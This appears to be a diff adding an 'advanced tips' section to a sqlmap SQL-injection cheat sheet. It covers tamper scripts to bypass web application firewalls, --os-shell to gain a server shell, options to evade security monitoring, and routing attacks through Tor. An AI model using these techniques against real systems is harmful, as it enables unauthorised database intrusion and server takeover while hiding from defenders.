@@ -46,3 +46,10 @@ sqlmap -r request.txt -p "username"
 ```bash
 sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3 --batch
 ```
+
+
+## Important Setup & Advanced Tips
+- **WAF Bypass**: Use `--tamper` scripts to bypass Web Application Firewalls (e.g., `--tamper=space2comment,between`).
+- **OS Shell**: If the DB user has high privileges, you can get a shell on the server using `--os-shell`.
+- **Stealth**: Use `--random-agent` and `--delay` to avoid tripping basic security monitoring.
+- **Tor/Proxies**: Route traffic through Tor using `--tor --tor-type=SOCKS5`.
